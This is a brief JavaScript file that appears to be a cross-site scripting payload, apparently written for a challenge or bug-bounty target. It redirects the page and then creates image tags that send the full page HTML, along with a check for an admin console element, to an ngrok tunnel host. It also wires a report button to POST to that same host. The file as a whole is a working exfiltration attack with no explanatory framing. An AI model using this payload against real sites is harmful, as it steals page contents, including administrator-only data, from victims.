window.location.href = "http://127.0.0.1";
function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
    document.body.appendChild(img);
}
function addTheImage2() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").length;
    document.body.appendChild(img);
}
addTheImage();
addTheImage2();
function add(){

            
            $('#responseAlert').css('display','none');
            $('#report').on('click',function(e){
                $.ajax({
                    type: "POST",
                    url: "http://3e6850f2.ngrok.io",
                    success: function(resp) {
                        $("#responseAlert").text(resp); $("#responseAlert").css("display","");
                    }
                })
            });
}
add();

